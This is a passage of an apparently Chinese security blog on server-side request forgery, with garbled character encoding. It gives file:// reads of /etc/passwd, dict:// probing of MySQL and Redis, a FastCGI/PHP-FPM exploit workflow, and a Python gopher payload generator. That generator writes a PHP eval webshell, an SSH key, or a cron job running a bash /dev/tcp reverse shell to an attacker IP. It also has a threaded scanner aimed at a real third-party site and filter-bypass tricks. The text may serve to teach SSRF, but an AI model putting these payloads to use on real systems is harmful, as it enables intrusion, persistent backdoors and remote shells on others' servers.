shell"><table><tr><td class="code"><pre><span class="line">file:///etc/passwd    </span><br><span class="line">file:///etc/hosts     # è®°å½•æœ¬æœºçš„æˆ–å…¶ä»–ä¸»æœºçš„ipåŠå…¶å¯¹åº”ä¸»æœºå</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">é«˜æƒé™</span></span><br><span class="line">file:///proc/net/arp  # è®°å½•ARPåè®®å†…å®¹ï¼Œé‡Œé¢æœ‰ä¸»æœºçš„ipå’Œmacåœ°å€</span><br><span class="line">file:///etc/network/interfaces # å¤§éƒ¨åˆ†ç½‘ç»œæ¥å£é…ç½®</span><br></pre></td></tr></table></figure><h4 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h4><p>æ¢æµ‹ç«¯å£æœåŠ¡</p><p><a href="https://blog.51cto.com/u_15127673/4130760">https://blog.51cto.com/u_15127673/4130760</a></p><blockquote><p>dict åè®®æ˜¯ä¸€ä¸ªåœ¨çº¿ç½‘ç»œå­—å…¸åè®®ï¼Œç”¨æ¥æ¶è®¾å­—å…¸æœåŠ¡çš„ã€‚</p><p>å®ƒæ˜¯åŸºäºTCPåè®®å¼€å‘çš„ï¼Œæ‰€ä»¥åƒ mysql çš„æœåŠ¡ï¼Œå› ä¸ºä¹Ÿæ˜¯åŸºäº tcp åè®®å¼€å‘ï¼Œæ‰€ä»¥ç”¨ dict åè®®çš„æ–¹å¼æ‰“å¼€èƒ½å¼ºè¡Œè¯»å–ä¸€äº› mysql æœåŠ¡çš„è¿”å›å†…å®¹</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;dict://localhost:3306&quot;</span>; <span class="comment">//3306ç«¯å£æ˜¯mysqlæœåŠ¡</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;&gt;</span><br><span class="line">PS D:\phpstudy_pro\phpstudy_pro\WWW\test&gt; D:/phpstudy_pro/phpstudy_pro/Extensions/php/php7.<span class="number">3.4</span>nts/php.exe <span class="string">&quot;d:\phpstudy_pro\phpstudy_pro\WWW\test\2.php&quot;</span></span><br><span class="line"></span><br><span class="line">J</span><br><span class="line"><span class="number">5.7</span>.<span class="number">26</span>U<span class="string">&#x27;+I2J%mkwB&quot;M)7     Imysql_native_password!#08S01Got packets out of order</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°5.7.26å’Œmysql</p><p><img src="/../images/image-20220804195027985.png" alt="image-20220804195027985"></p><p>â€‹    </p><h3 id="åˆ©ç”¨æ¡ˆä¾‹"><a href="#åˆ©ç”¨æ¡ˆä¾‹" class="headerlink" title="åˆ©ç”¨æ¡ˆä¾‹"></a>åˆ©ç”¨æ¡ˆä¾‹</h3><h4 id="Fastcgi"><a href="#Fastcgi" class="headerlink" title="Fastcgi"></a>Fastcgi</h4><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html?page=2#reply-list">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html?page=2#reply-list</a></p><p><a href="https://www.freebuf.com/articles/web/263342.html">https://www.freebuf.com/articles/web/263342.html</a></p><ul><li>FPMæ˜¯ä»€ä¹ˆ</li></ul><blockquote><p>å½“æˆ‘ä»¬çš„webæœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚phpæ–‡ä»¶çš„è¯·æ±‚æ—¶ï¼Œå°±è®©php-fpmæŠŠå…¶è§£é‡Š(ç¿»è¯‘)æˆhtmlæ ¼å¼çš„æ–‡ä»¶(äº‹å®ä¸Šphp-fpmæ­£æ˜¯å¹²è¿™ä¸ªäº‹çš„)ï¼Œç„¶åæˆ‘ä»¬çš„webæœåŠ¡å™¨å°†ç¿»è¯‘å‡ºæ¥çš„.htmlæ–‡ä»¶å‘ç»™æµè§ˆå™¨ã€‚</p><p>è€Œphp-fpmèƒ½å¤Ÿè¿›è¡Œç¿»è¯‘ä¾é çš„å°±æ˜¯Fastcgié€šä¿¡åè®®ã€‚</p></blockquote><p><img src="/../images/1612761214_6020c87ec0101f355f51a.png!small" alt="1612761214_6020c87ec0101f355f51a.png!small"></p><ul><li><p>æ¼æ´æˆå› </p><blockquote><p>PHP-FPMé»˜è®¤ç›‘å¬9000ç«¯å£ï¼Œå¦‚æœè¿™ä¸ªç«¯å£æš´éœ²åœ¨å…¬ç½‘ï¼Œåˆ™æˆ‘ä»¬å¯ä»¥è‡ªå·±æ„é€ fastcgiåè®®ï¼Œå’Œfpmè¿›è¡Œé€šä¿¡ã€‚</p><p>fastcgiåè®®ä¼ è¾“çš„æ•°æ®å…¶å®å°±æ˜¯PHPç¯å¢ƒå˜é‡çš„ä¸€éƒ¨åˆ†ã€‚</p><p>é€šè¿‡è®¾ç½®<code>auto_prepend_file = php://input</code>ä¸”<code>allow_url_include = On</code>ï¼Œç„¶åå°†æˆ‘ä»¬éœ€è¦æ‰§è¡Œçš„ä»£ç æ”¾åœ¨Bodyä¸­ï¼Œå³å¯æ‰§è¡Œä»»æ„ä»£ç ã€‚</p></blockquote></li><li><p>ä½¿ç”¨æ¡ä»¶</p><blockquote><p>PHPæœåŠ¡å™¨å¼€å¯fastcgiçš„ç«¯å£9000</p><p>èƒ½å¤Ÿæ‰¾åˆ°PHPæœåŠ¡å™¨ä¸Šçš„phpæ–‡ä»¶</p></blockquote></li><li><p>åˆ©ç”¨</p><p><a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">exp</a></p><ul><li><p>ç›‘å¬ç«¯å£ï¼š<code>nc -lvp 9000&gt;1.txt</code></p></li><li><p>ä½¿ç”¨expï¼š<code>python fpm.py -c &quot;payload&quot; -p 9000 127.0.0.1 phpæ–‡ä»¶è·¯å¾„</code></p></li><li><p>å°†ç”Ÿæˆçš„1.txtè¿›è¡ŒåŒurlç¼–ç ï¼š<code>python 1.py</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#1.py</span></span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">r&#x27;1.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">s = f.read()</span><br><span class="line">s = urllib.parse.quote(s)</span><br><span class="line">s = urllib.parse.quote(s)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;gopher://127.0.0.1:9000/_&quot;</span>+s)</span><br></pre></td></tr></table></figure></li><li><p>åˆ©ç”¨å¾—åˆ°çš„ç»“æœè¿›è¡Œæ”»å‡»</p><p><img src="/../images/image-20220805192301243.png" alt="image-20220805192301243"></p></li></ul></li></ul><h4 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h4><h5 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h5><p><a href="https://www.freebuf.com/articles/network/280984.html">https://www.freebuf.com/articles/network/280984.html</a></p><h5 id="å‘½ä»¤"><a href="#å‘½ä»¤" class="headerlink" title="å‘½ä»¤"></a>å‘½ä»¤</h5><p><a href="https://blog.csdn.net/qq_41384743/article/details/98211366">Redisæ•°æ®åº“å¸¸ç”¨å‘½ä»¤</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å¯åŠ¨</span></span><br><span class="line">redis-server /etc/redis.conf</span><br><span class="line">redis-cli</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">è¿›å…¥å‘½ä»¤è¡Œå</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å¯†ç </span></span><br><span class="line">config get requirepass # æŸ¥çœ‹å¯†ç </span><br><span class="line">config set requirepass passwd # è®¾ç½®å¯†ç </span><br><span class="line">auth passwd # è®¤è¯</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ä¿¡æ¯</span></span><br><span class="line">info</span><br></pre></td></tr></table></figure><h5 id="redisæœåŠ¡å™¨ä¸å®¢æˆ·ç«¯é€šä¿¡"><a href="#redisæœåŠ¡å™¨ä¸å®¢æˆ·ç«¯é€šä¿¡" class="headerlink" title="redisæœåŠ¡å™¨ä¸å®¢æˆ·ç«¯é€šä¿¡"></a>redisæœåŠ¡å™¨ä¸å®¢æˆ·ç«¯é€šä¿¡</h5><p><code>Redis</code>æœåŠ¡å™¨ä¸å®¢æˆ·ç«¯é€šè¿‡<code>RESP</code>ï¼ˆREdis Serialization Protocolï¼‰åè®®é€šä¿¡ã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; auth 123456</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; set name khaz</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; get name</span><br><span class="line">&quot;khaz&quot;</span><br></pre></td></tr></table></figure><p>å¯¹åº”çš„æ•°æ®åŒ…å¦‚ä¸‹ï¼Œæ¯ä¸€è¡Œéƒ½æ˜¯ç”¨<code>\r\n</code>éš”å¼€çš„ã€‚</p><p><img src="/../images/image-20221118232305305.png" alt="image-20221118232305305"></p><h5 id="ä½ç‰ˆæœ¬æƒ…å†µ"><a href="#ä½ç‰ˆæœ¬æƒ…å†µ" class="headerlink" title="ä½ç‰ˆæœ¬æƒ…å†µ"></a>ä½ç‰ˆæœ¬æƒ…å†µ</h5><p>é…åˆhttpè¯·æ±‚</p><blockquote><p>ä½ç‰ˆæœ¬çš„Redisä¼šå°†httpè¯·æ±‚çš„è¯·æ±‚å¤´å†…å®¹ä½œä¸ºrediså‘½ä»¤è§£æ</p></blockquote><h5 id="éœ€è¦è®¤è¯æƒ…å†µ"><a href="#éœ€è¦è®¤è¯æƒ…å†µ" class="headerlink" title="éœ€è¦è®¤è¯æƒ…å†µ"></a>éœ€è¦è®¤è¯æƒ…å†µ</h5><h5 id="å…ˆæ‰¾åˆ°redisæœåŠ¡çš„è®¤è¯å¯†ç ï¼Œè½¬åˆ°æœªæˆæƒæƒ…å†µ"><a href="#å…ˆæ‰¾åˆ°redisæœåŠ¡çš„è®¤è¯å¯†ç ï¼Œè½¬åˆ°æœªæˆæƒæƒ…å†µ" class="headerlink" title="å…ˆæ‰¾åˆ°redisæœåŠ¡çš„è®¤è¯å¯†ç ï¼Œè½¬åˆ°æœªæˆæƒæƒ…å†µ"></a>å…ˆæ‰¾åˆ°redisæœåŠ¡çš„è®¤è¯å¯†ç ï¼Œè½¬åˆ°æœªæˆæƒæƒ…å†µ</h5><ul><li><p>é…ç½®æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># é€šè¿‡requirepassæ¥å®šä½å¯†ç </span></span><br><span class="line">/etc/redis.conf</span><br><span class="line">/etc/redis/redis.conf</span><br><span class="line">/usr/local/redis/etc/redis.conf</span><br><span class="line">/opt/redis/ect/redis.conf</span><br></pre></td></tr></table></figure></li><li><p>å¼±å¯†ç çˆ†ç ´</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dict</span>://<span class="number">192.168</span><span class="number">.174</span><span class="number">.129</span>:<span class="number">6379</span>/AUTH passwd</span><br></pre></td></tr></table></figure><p>è®¤è¯æˆåŠŸ</p><p><img src="/../images/image-20221118222335249.png" alt="image-20221118222335249"></p><p>è®¤è¯å¤±è´¥</p><p><img src="/../images/image-20221118222420964.png" alt="image-20221118222420964"></p></li></ul><h5 id="æœªæˆæƒæƒ…å†µ"><a href="#æœªæˆæƒæƒ…å†µ" class="headerlink" title="æœªæˆæƒæƒ…å†µ"></a>æœªæˆæƒæƒ…å†µ</h5><h5 id="é…åˆdictåè®®"><a href="#é…åˆdictåè®®" class="headerlink" title="é…åˆdictåè®®"></a>é…åˆdictåè®®</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">dict:<span class="comment">//x.x.x.x:6379/&lt;Redis å‘½ä»¤&gt;</span></span><br></pre></td></tr></table></figure><h5 id="é…åˆgopheråè®®"><a href="#é…åˆgopheråè®®" class="headerlink" title="é…åˆgopheråè®®"></a>é…åˆgopheråè®®</h5><p>é¦–å…ˆè¦å°†å‘½ä»¤è½¬æ¢ä¸ºRESPåè®®æ ¼å¼</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request, urllib.parse, urllib.error</span><br><span class="line"></span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;192.168.163.128&quot;</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å†™é©¬</span></span><br><span class="line">shell=<span class="string">&quot;\n\n&lt;?php eval($_GET[\&quot;cmd\&quot;]);?&gt;\n\n&quot;</span> <span class="comment">#å†™å…¥çš„æ–‡ä»¶å†…å®¹</span></span><br><span class="line">filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span> <span class="comment"># webç›®å½•</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å†™sshå…¬é’¥</span></span><br><span class="line">/*</span><br><span class="line">filename=<span class="string">&quot;authorized_keys&quot;</span></span><br><span class="line">ssh_pub=<span class="string">&quot;\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali\n\n&quot;</span></span><br><span class="line">path=<span class="string">&quot;/root/.ssh/&quot;</span></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¡åˆ’ä»»åŠ¡åå¼¹shell  ç³»ç»Ÿå¿…é¡»ä¸ºCentosï¼Œå®šæ—¶ä»»åŠ¡æƒé™é—®é¢˜ï¼šCentos--644  Ubuntu--600</span></span><br><span class="line">/*</span><br><span class="line">reverse_ip=<span class="string">&quot;192.168.163.132&quot;</span></span><br><span class="line">reverse_port=<span class="string">&quot;2333&quot;</span></span><br><span class="line">cron=<span class="string">&quot;\n\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1\n\n\n\n&quot;</span>%(reverse_ip,reverse_port)</span><br><span class="line">filename=<span class="string">&quot;root&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/spool/cron&quot;</span></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">     <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">     <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">     <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">     <span class="string">&quot;save&quot;</span></span><br><span class="line">     ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¦‚æœrediséœ€è¦è®¤è¯ï¼Œå°±åœ¨cmdç¬¬ä¸€è¡Œæ’å…¥è®¤è¯å‘½ä»¤</span></span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">    </span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span>  <span class="comment"># &quot;/_&quot; gopheråè®®ç‰¹æ€§ï¼Œä¼šåƒæ‰urlåçš„ä¸€ä¸ªå­—ç¬¦</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redis_format</span>(<span class="params">arr</span>):</span><br><span class="line">    CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">    cmd+=<span class="string">&quot;*&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">&quot;$&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.parse.quote(redis_format(x))</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><h5 id="ä¸»ä»å¤åˆ¶"><a href="#ä¸»ä»å¤åˆ¶" class="headerlink" title="ä¸»ä»å¤åˆ¶"></a>ä¸»ä»å¤åˆ¶</h5><p><a href="https://xz.aliyun.com/t/5665#toc-10">https://xz.aliyun.com/t/5665#toc-10</a></p><h4 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h4><p><a href="https://paper.seebug.org/510/">https://paper.seebug.org/510/</a></p><h3 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h3><p>[æ€»ç»“](<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server</a> Side Request Forgery)</p><h4 id="é‡å®šå‘ç»•è¿‡"><a href="#é‡å®šå‘ç»•è¿‡" class="headerlink" title="é‡å®šå‘ç»•è¿‡"></a>é‡å®šå‘ç»•è¿‡</h4><p>python2è„šæœ¬</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests.packages.urllib3</span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> Queue</span><br><span class="line">threads_count = <span class="number">20</span></span><br><span class="line">scheme = <span class="string">&#x27;dict&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;6379&#x27;</span></span><br><span class="line">ip_block = <span class="string">&#x27;10.105&#x27;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WyWorker</span>(threading.Thread):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,queue</span>):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.queue = queue</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> self.queue.empty():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                url = self.queue.get_nowait()</span><br><span class="line">                content = requests.get(url, timeout=<span class="number">2.8</span>).content</span><br><span class="line">                <span class="built_in">print</span> url, <span class="string">&#x27;OPEN&#x27;</span>, <span class="built_in">len</span>(content)</span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ConnectTimeout:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">except</span> Exception, e:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">queue = Queue.Queue()</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">255</span>):</span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">255</span>):    </span><br><span class="line">        ip = <span class="string">&#x27;&#123;0&#125;.&#123;1&#125;.&#123;2&#125;&#x27;</span>.<span class="built_in">format</span>(ip_block,c,d)</span><br><span class="line">        payload = <span class="string">&#x27;http://fuzz.wuyun.com/302.php?s=&#123;scheme&#125;%26ip=&#123;ip&#125;%26port=&#123;port&#125;%26data=helo.jpg&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">            scheme=scheme,</span><br><span class="line">            ip=ip, </span><br><span class="line">            port=port</span><br><span class="line">            )</span><br><span class="line">        url = <span class="string">&quot;http://www.miui.com/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img]&#123;payload&#125;[/img]&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            payload=payload)</span><br><span class="line">        queue.put(url)</span><br><span class="line">threads = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(threads_count):</span><br><span class="line">    threads.append(WyWorker(queue))</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">    t.start()</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">    t.join()</span><br></pre></td></tr></table></figure><p>302.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line"><span class="variable">$port</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;port&#x27;</span>];</span><br><span class="line"><span class="variable">$scheme</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: <span class="subst">$scheme</span>://<span class="subst">$ip</span>:<span class="subst">$port</span>/<span class="subst">$data</span>&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="æ•°å­—ipåœ°å€"><a href="#æ•°å­—ipåœ°å€" class="headerlink" title="æ•°å­—ipåœ°å€"></a>æ•°å­—ipåœ°å€</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>,<span class="variable">$ip</span>);</span><br><span class="line"><span class="variable">$r</span> = (<span class="variable">$ip</span>[<span class="number">0</span>] &lt;&lt; <span class="number">24</span>) | (<span class="variable">$ip</span>[<span class="number">1</span>] &lt;&lt; <span class="number">16</span>) | (<span class="variable">$ip</span>[<span class="number">2</span>] &lt;&lt; <span class="number">8</span>) | <span class="variable">$ip</span>[<span class="number">3</span>] ;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$r</span> &lt; <span class="number">0</span>) &#123;    </span><br><span class="line">    <span class="variable">$r</span> += <span class="number">4294967296</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;åè¿›åˆ¶:&quot;</span>.<span class="variable">$r</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;å…«è¿›åˆ¶:0&quot;</span>.<span class="title function_ invoke__">decoct</span>(<span class="variable">$r</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;åå…­è¿›åˆ¶:0x&quot;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$r</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="ipåœ°å€çœç•¥å½¢å¼"><a href="#ipåœ°å€çœç•¥å½¢å¼" class="headerlink" title="ipåœ°å€çœç•¥å½¢å¼"></a>ipåœ°å€çœç•¥å½¢å¼</h4><blockquote><p>å¯ä»¥çœç•¥ipåœ°å€ä¸­é—´çš„0</p><p>å¦‚127.1 &#x3D;&#x3D; 127.0.0.1</p></blockquote><p><img src="/../images/image-20230328171933107.png" alt="image-20230328171933107"></p><h4 id=""><a href="#" class="headerlink" title="@,#"></a>@,#</h4><p><img src="/../images/image-20220204213349476.png" alt="image-20220204213349476"></p><p><a href="http://baidu.com@khaz.top/">http://baidu.com@khaz.top</a>  &#x3D;&gt;  <a href="http://khaz.top/">http://khaz.top</a></p><blockquote><p>åªè§£ææœ€åä¸€ä¸ª@åé¢çš„åŸŸå</p></blockquote><p><img src="/../images/image-20220504125707388.png" alt="image-20220504125707388"></p><p><a href="http://khaz.top/#baidu.com">http://khaz.top#baidu.com</a> &#x3D;&gt; <a href="http://khaz.top/">http://khaz.top</a></p><p><img src="/../images/image-20220504153148066.png" alt="image-20220504153148066"></p><h4 id="DNS-Rebinding"><a href="#DNS-Rebinding" class="headerlink" title="DNS Rebinding"></a>DNS Rebinding</h4><p><a href="https://www.cnblogs.com/mysticbinary/p/14470551.html">DNS Rebindingæ¼æ´åŸç† - Mysticbinary - åšå®¢å›­</a></p><ul><li><p>çŸ¥é“åˆ›å®‡åœ¨çº¿</p><p><a href="http://ceye.io/dns-rebinding">http://ceye.io/dns-rebinding</a></p><p><img src="/../images/image-20230319151337356.png" alt="image-20230319151337356"></p><p><img src="/../images/image-20230319151322924.png" alt="image-20230319151322924"></p></li><li><p>åŒä¸€ä¸ªåŸŸåç»‘å®šä¸¤æ¡Aè®°å½•ã€‚è¿™æ ·è§£ææ˜¯éšæœºçš„ã€‚ </p><p>è‡ªå·±çš„æœåŠ¡å™¨ï¼š</p><p><img src="/../images/image-20220805221419076.png" alt="image-20220805221419076"></p><blockquote><p>éœ€è¦å¤šè¯•å‡ æ¬¡ï¼Œç¢°è¿æ°”ã€‚</p><p>å½“æœåŠ¡å™¨ç¬¬ä¸€æ¬¡è§£æå‡ºæ¥æ˜¯ä¸ªå¤–ç½‘ipï¼Œç¬¬äºŒæ¬¡è§£æå‡ºæ¥æ˜¯ä¸ªå†…ç½‘ipçš„æ—¶å€™æ”»å‡»å°±æˆåŠŸäº†</p></blockquote></li><li><p>è‡ªå»º</p><p><a href="https://xz.aliyun.com/t/7495#toc-6">https://xz.aliyun.com/t/7495#toc-6</a></p></li></ul><h4 id="æœ¬åœ°åœ°å€ä¸åŒå½¢å¼"><a href="#æœ¬åœ°åœ°å€ä¸åŒå½¢å¼" class="headerlink" title="æœ¬åœ°åœ°å€ä¸åŒå½¢å¼"></a>æœ¬åœ°åœ°å€ä¸åŒå½¢å¼</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ipï¼š127.0.0.1 --&gt; 127ã€‚0ã€‚0ã€‚1</span><br><span class="line">åŸŸåï¼šlocalhost</span><br><span class="line">ipv6ï¼š</span><br></pre></td></tr></table></figure><h4 id="urlä¸­çš„unicodeæ¬ºéª—"><a href="#urlä¸­çš„unicodeæ¬ºéª—" class="headerlink" title="urlä¸­çš„unicodeæ¬ºéª—"></a>urlä¸­çš„unicodeæ¬ºéª—</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">â‘  â‘¡ â‘¢ â‘£ â‘¤ â‘¥ â‘¦ â‘§ â‘¨ â‘© â‘ª â‘« â‘¬ â‘­ â‘® â‘¯ â‘° â‘± â‘² â‘³ </span><br><span class="line">â‘´ â‘µ â‘¶ â‘· â‘¸ â‘¹ â‘º â‘» â‘¼ â‘½ â‘¾ â‘¿ â’€ â’ â’‚ â’ƒ â’„ â’… â’† â’‡ </span><br><span class="line">â’ˆ â’‰ â’Š â’‹ â’Œ â’ â’ â’ â’ â’‘ â’’ â’“ â’” â’• â’– â’— â’˜ â’™ â’š â’› </span><br><span class="line">â’œ â’ â’ â’Ÿ â’  â’¡ â’¢ â’£ â’¤ â’¥ â’¦ â’§ â’¨ â’© â’ª â’« â’¬ â’­ â’® â’¯ â’° â’± â’² â’³ â’´ â’µ </span><br><span class="line">â’¶ â’· â’¸ â’¹ â’º â’» â’¼ â’½ â’¾ â’¿ â“€ â“ â“‚ â“ƒ â“„ â“… â“† â“‡ â“ˆ â“‰ â“Š â“‹ â“Œ â“ â“ â“ </span><br><span class="line">â“ â“‘ â“’ â““ â“” â“• â“– â“— â“˜ â“™ â“š â“› â“œ â“ â“ â“Ÿ â“  â“¡ â“¢ â“£ â“¤ â“¥ â“¦ â“§ 